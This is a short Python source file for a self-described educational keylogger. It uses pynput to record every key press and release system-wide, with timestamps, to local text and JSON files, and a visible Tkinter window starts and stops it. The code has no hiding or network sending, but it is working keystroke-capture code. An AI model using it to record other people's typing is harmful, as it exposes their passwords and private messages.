# ==============================
# EDUCATIONAL KEYLOGGER PROJECT
# ==============================

from pynput import keyboard
import json
import tkinter as tk
from datetime import datetime

listener = None
logging_active = False
key_list = []

# ---------- FILE HANDLERS ----------

def write_text_file(key):
    with open("logs.txt", "a") as f:
        f.write(f"{key}\n")

def write_json_file():
    with open("logs.json", "w") as f:
        json.dump(key_list, f, indent=4)

# ---------- KEY EVENTS ----------

def on_press(key):
    if logging_active:
        entry = {
            "event": "Pressed",
            "key": str(key),
            "time": str(datetime.now())
        }
        key_list.append(entry)
        write_text_file(f"Pressed: {key}")
        write_json_file()

def on_release(key):
    if logging_active:
        entry = {
            "event": "Released",
            "key": str(key),
            "time": str(datetime.now())
        }
        key_list.append(entry)
        write_text_file(f"Released: {key}")
        write_json_file()

# ---------- CONTROL FUNCTIONS ----------

def start_logging():
    global listener, logging_active
    if not logging_active:
        logging_active = True
        status_label.config(text="Status: Logging Started", fg="green")
        listener = keyboard.Listener(
            on_press=on_press,
            on_release=on_release
        )
        listener.start()

def stop_logging():
    global listener, logging_active
    if logging_active:
        logging_active = False
        status_label.config(text="Status: Logging Stopped", fg="red")
        if listener:
            listener.stop()

# ---------- GUI ----------

root = tk.Tk()
root.title("Educational Keylogger")
root.geometry("350x200")

title = tk.Label(root, text="Keylogger – Educational Project", font=("Arial", 12, "bold"))
title.pack(pady=10)

start_btn = tk.Button(root, text="Start Logging", width=20, command=start_logging)
start_btn.pack(pady=5)

stop_btn = tk.Button(root, text="Stop Logging", width=20, command=stop_logging)
stop_btn.pack(pady=5)

status_label = tk.Label(root, text="Status: Not Started", fg="blue")
status_label.pack(pady=10)

note = tk.Label(
    root,
    text="For educational purposes only",
    font=("Arial", 8),
    fg="gray"
)
note.pack()

root.mainloop()
